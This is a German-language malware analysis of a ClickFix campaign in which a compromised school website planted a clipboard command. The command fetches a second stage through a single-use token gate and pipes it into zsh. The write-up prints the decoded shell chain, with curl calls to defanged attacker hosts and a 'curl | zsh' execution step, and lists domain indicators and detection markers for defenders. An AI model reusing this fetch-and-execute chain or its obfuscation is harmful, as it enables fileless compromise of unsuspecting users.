# Ein Versuch: eine ClickFix-Kette, die sich kein zweites Mal analysieren lässt

## Was ein Einmal-Gate mit der Vorfallsbearbeitung macht — und warum der Quelltext diesen Fall nicht von einem legitimen unterscheiden konnte

*Erstdokumentation, August 2026*

---

## Kurzfassung

Die Website einer deutschen Grundschule lieferte ein gefälschtes Cloudflare-Overlay zur
„menschlichen Verifizierung" aus, das Besucher anwies, `⌘+Leertaste → Terminal → ⌘+V →
Enter` zu drücken. Beim Seitenaufruf hatte JavaScript längst einen Befehl in die
Zwischenablage geschrieben. Wer ihn einfügt, lädt eine zweite Stufe und leitet sie direkt
in `zsh` — nichts landet auf der Festplatte, und die betroffene Person führt den Code unter
ihren eigenen Rechten aus. Gatekeeper, XProtect und Download-Sperren kommen dabei gar nicht
erst zu Wort.

Bemerkenswert ist nicht die Technik, die ist gut dokumentiert. Bemerkenswert ist das
**Gate**: Die erste Stufe meldet sich mit einem opferindividuellen Token bei einem
Kontrollserver, und dieses Token wird **genau einmal** akzeptiert. Beim zweiten Versuch
kommt nichts mehr. Diese eine Entwurfsentscheidung stellt die gesamte Untersuchung um — und
sie vereitelte den Versuch, rund 70 Minuten nach einer öffentlichen Meldung ein frisches
Sample zu beschaffen.

Diese Notiz ist das operative Gegenstück zum [Ad-Shield-Fall](../2026-08-ad-shield-welt-de/),
der aus sehr ähnlich aussehenden Belegen den gegenteiligen Schluss zog. Zusammen gelesen
ergeben die beiden erst das Argument.

---

## 1. Die Kette

**Stufe 0 — die Zwischenablage.** 477 Bytes, beim Seitenaufruf geschrieben:

```sh
_7dcf=<hex>;eval "$(printf '%s' '<base64>'|base64 -d)"
```

**Stufe 1 — nach einer Dekodierung:**

```sh
_xr=$(curl -s 'hxxp://enter-pverif-code[.]info/p/<opferindividuelles-token>')
if [ "$_xr" = "ok" ]; then
    curl -s $(echo "<base64>" | openssl base64 -d -A) | zsh
fi
```

**Stufe 2 — aus der inneren Schicht:**

```
hxxps://ferncurrent14[.]com/curl/<kampagnen-token>
```

Drei Details, die man behalten sollte:

- Stufe 1 läuft über **einfaches HTTP**, Stufe 2 über HTTPS. Die Gate-Abfrage ist damit auf
  der Leitung mitlesbar — ein Geschenk an die Netzwerkerkennung und eine merkwürdige Wahl
  des Betreibers.
- Die innere Schicht nutzt `openssl base64 -d -A` statt `base64 -d`. Gleiches Ergebnis,
  andere Zeichenfolge — genug, um an einer naiven Signatur vorbeizukommen, die auf die
  naheliegende Form abstellt.
- Die Wegwerf-Variablenpräfixe (`_7dcf`, `_xr`) wechseln zwischen Kampagnen, sind innerhalb
  einer aber stabil. Das macht sie zu brauchbarem Jagdmaterial und zu schlechtem
  Blockmaterial.

---

## 2. Das Gate und was es kostet

Der Kontrollserver antwortet je Token einmal mit `ok`. Beim zweiten Abruf kommt nichts
zurück, und die `if`-Bedingung greift nie.

Dem Betreiber bringt das saubere Telemetrie pro Klick und macht wiederholte Ausführung in
Analyseumgebungen wertlos. Für die Untersuchung heißt es:

- **Stufe 2 lässt sich nicht nachträglich holen.** Wenn der Zwischenablage-Inhalt vor einem
  liegt, kann das Token längst verbraucht sein — durch das Opfer oder durch den eigenen
  ersten Blick.
- **Das Payload ist im Nachhinein nicht überprüfbar.** Die *Adresse* der zweiten Stufe
  lässt sich genau angeben. Was sie tat, nicht — wir hatten sie nie (siehe Abschnitt 5).
- **Nachanalyse ist kein Auffangnetz.** Bei gewöhnlicher Web-Malware kann man das Artefakt
  meist erneut abrufen. Hier ist der erste Kontakt der einzige.

Praktisch kehrt das die übliche Reihenfolge um. Normalerweise: beobachten, Hypothese
bilden, dann sammeln, was die Hypothese braucht. Gegen ein Einmal-Gate gilt: **zuerst
sichern, in voller Treue, dann nachdenken.** Den Zwischenablage-Inhalt byteweise
festhalten, bevor er dekodiert, bevor er irgendwo eingefügt, bevor entschieden wird, was er
ist.

Aufgeschrieben klingt das selbstverständlich. Es ist nicht das, was passiert, wenn eine
Seite kaputt aussieht und der erste Reflex ist, daran herumzuprobieren.

---

## 3. Das Zeitfenster, gemessen

Am 04.08.2026 enthielt ein öffentlicher Feed einen Schwung von 29 Apex-Domains mit dem Tag
ClickFix, eingereicht um 16:56:50 UTC. Eine davon war `ferncurrent14[.]com` — derselbe
Stufe-2-Host wie in diesem Fall, was den Schwung überhaupt erst mit ihm verband.

Acht dieser Ziele wurden kurz nach 18:08 UTC abgerufen, reines Herunterladen. Rund
**70 Minuten** nach der öffentlichen Meldung:

| Zieltyp | Ergebnis |
|---|---|
| Angreiferregistrierte Hosts (3) | 404 hinter Cloudflare, 521 und 522 — Origins weg |
| Ein Lure-Pfad, eine Stunde zuvor noch da | 404 |
| Kompromittierte legitime Seiten (4) | saubere Originalseiten, keine Injektion |

Eine YARA-Regel für die Lure-Seite matchte auf **nichts**. Ein Referer-Bypass mit
macOS-Safari-Kennung änderte nichts.

Entscheidend war eine passive, keine aktive Beobachtung: Die Screenshots des öffentlichen
Scandienstes, aufgenommen zum Einreichungszeitpunkt, zeigen für dieselben Domains **die
gleichen sauberen Seiten** und `403 Forbidden` für die angreifereigenen Hosts. Der Scanner
war genauso ausgesperrt worden wie wir. Ein archiviertes DOM hätte also auch nicht
geholfen — im Archiv stand von vornherein nichts.

Das Gating ist damit stärker als eine Filterung über User-Agent oder Referer.
One-Shot-pro-IP, Geofilterung oder eine erforderliche Weiterleitungskette aus Malvertising
passen alle zum Befund. Welcher Mechanismus es auch ist — die operative Zahl zählt: **Bei
dieser Kampagne ist eine Lure innerhalb eines Fensters von deutlich unter einer Stunde
erreichbar, wenn überhaupt, und von einer Forschungsadresse aus womöglich gar nicht.**

---

## 4. Der Cluster

Die 29 Domains trennen sich sauber nach Alter, und die Trennung deckt sich mit den Rollen:

- **Acht Domains, innerhalb von sechs Tagen registriert** — die beweglichen Teile.
  Gating-Hosts, Loader-Hosts, Wegwerfnamen. Zwei davon, `enter-pverif-code[.]info` (das
  Gate dieses Falls) und `makeverizyjar[.]info`, waren beide null Tage alt und antworteten
  mit *identischer Antwortlänge*. Gleiche Rolle, gleiches Alter, gleiche Größe: ein
  Schwester-Gate, vorbehaltlich Bestätigung.
- **21 etablierte Seiten**, etwa ein bis zehn Jahre alt, überwiegend WordPress. Sie sind
  die Auslieferungsfläche — die kompromittierten Websites anderer Leute.

Eine davon, `v-k[.]com[.]ua`, trug einen Pfad namens `vcapcha.ps1`. Eine PowerShell-Datei,
benannt nach einem gefälschten Captcha, ist der Windows-Arm derselben Technik aus demselben
Cluster. Bis dahin galt eine Windows-Variante als „wahrscheinlich, aber unbeobachtet"; die
Frage ist damit erledigt.

**Die 21 sind Geschädigte, keine Infrastruktur.** Sie stehen hier zur Einordnung und
bleiben bewusst aus den Indikatordateien heraus. Sie zu blockieren bestraft ihre eigenen
Nutzer und schafft ein Delisting-Problem für Leute, die nichts getan haben. Der Unterschied
zwischen „taucht in einer Kampagne auf" und „gehört zur Kampagne" ist die eigentliche
Arbeit.

---

## 5. Was diese Notiz nicht belegt

- **Das Payload.** Stufe 2 wurde nie abgerufen. Sie einer bestimmten Infostealer-Familie
  zuzuordnen wäre ein Schluss aus der Form der Kette, kein Befund. Wir ziehen ihn nicht.
- **Attribution.** Nichts hier sagt, wer dahintersteht. Eine Länderkennung ist kein
  Standort, ein Standort ist keine Staatsangehörigkeit, und gemietete Infrastruktur ist
  kein Eigentum. Es wurden weder WHOIS-Abfragen noch Geolokalisierungen durchgeführt, und
  die Edge-Kennungen in Serverantworten bezeichnen den nächstgelegenen Standort des
  *Abrufenden*, nicht den des Ziels.
- **Das Ausmaß.** Wie viele Menschen das Overlay gesehen und wie viele ihm gefolgt sind,
  beantworten allein die Serverprotokolle der betroffenen Seite. Die liegen beim Betreiber.

---

## 6. Indikatoren

Vollständig und maschinenlesbar, CC0: [`evidence/iocs.txt`](evidence/iocs.txt).

```
enter-pverif-code.info      Gate Stufe 1 / Klick-Telemetrie (einfaches HTTP)
makeverizyjar.info          vermutetes Schwester-Gate, unbestätigt
ferncurrent14.com           Loader-Host Stufe 2
```

**Verhaltensmarker** — dauerhafter als die Domains, die im Tagesrhythmus rotieren:

```
eval "$(printf '%s' '<b64>'|base64 -d)"     äußere Schicht
openssl base64 -d -A                        zweite Dekodierschicht
curl -s … | zsh                             dateilose Ausführung
_7dcf / _xr                                 Wegwerf-Variablenpräfixe
```

Erkennungsregeln, die dekodierte Kette, die vollständige Cluster-Auswertung zu allen 29
Domains und das Werkzeug zur Sicherung liegen in einem eigenen Repository:
**[macos-threat-tracking](https://github.com/raimurokko/macos-threat-tracking)**. Das dort
abgelegte Zwischenablage-Sample trägt die MD5 `2169ff5e7be77fc3ff72758f9fa50658` — die
Referenz-Prüfsumme zweier veröffentlichter YARA-Regeln. Die Regeln lassen sich damit gegen
genau das Artefakt prüfen, aus dem sie entstanden sind.

---

## 7. Die Lehre und ihr Zwilling

Der methodische Kern steht in Abschnitt 2: **Gegen Einmal-Infrastruktur kommt das Sichern
vor der Analyse.** Es gibt keinen zweiten Blick, also ist die Treue beim ersten Kontakt das
Einzige, was überlebt.

Der unangenehmere Punkt zeigt sich aber erst, wenn man diesen Fall neben die
[Ad-Shield-Notiz](../2026-08-ad-shield-welt-de/) in diesem Repository legt.

Dort lieferte eine große Nachrichtenseite ein obfuskiertes, ins HTML injiziertes Script
aus, mit Attributen zur Umgehung von Optimierern, das eine Domain kontaktierte, die
Filterlisten als Adware führen. Jeder Oberflächenbefund sagte *Kompromittierung*. Es war
eine bezahlte, vom Verlag bewusst eingebundene Funktion.

Hier lieferte eine Schulwebsite ein obfuskiertes, ins HTML injiziertes Script aus, mit
Markern und Umgehungsmerkmalen derselben allgemeinen Form. Jeder Oberflächenbefund sagte
*Kompromittierung*. Diesmal war es eine.

Der Quelltext konnte die beiden nicht unterscheiden. Im ersten Fall kam die Antwort aus der
Domain-Reputation, im zweiten aus dem Verhalten der Infrastruktur — dem Gate, dem Token,
der Rotation. In keinem der beiden kam sie daher, den Code genauer zu lesen.

Das ist der Erwähnung wert, weil der Reflex in die andere Richtung geht: **Wenn injizierter
Fremdcode in einer Seite auftaucht, in der man ihn nicht erwartet hat, löst mehr
Code-Analyse das selten auf.** Auflösen lässt es sich, indem man klärt, wer der Absender
ist und wie sich seine Infrastruktur verhält.

---

## 8. Umgang mit dem Fall

Die betroffene Schule wurde am selben Tag unterrichtet, unentgeltlich und ohne
Auftragsinteresse, mit Maßnahmenvorschlägen und einem Textbaustein für die Elternschaft.
**Die Seite wird hier bewusst nicht benannt**, und es wird kein Screenshot von ihr
veröffentlicht: Sie ist Geschädigte, der Betreiber hat die Information zuerst erhalten, und
eine Benennung nützte keinem Verteidiger.

Angreiferkontrollierte Indikatoren werden vollständig veröffentlicht, TLP:CLEAR, weil sie
genau dadurch brauchbar werden. Die beiden Kategorien werden absichtlich getrennt gehalten
— eine Kampagnenbeschreibung, die ihre Opfer benennt, um gründlich zu wirken, hat
Dokumentation mit Bloßstellung verwechselt.

---

*Diese Notiz dokumentiert Beobachtungen vom 04.08.2026 und den folgenden Tagen. Die Analyse
des Zwischenablage-Inhalts erfolgte statisch, es wurde nichts ausgeführt. Infrastruktur
dieser Art ändert sich binnen Tagen; mehrere der genannten Indikatoren waren bereits tot,
als dies geschrieben wurde.*
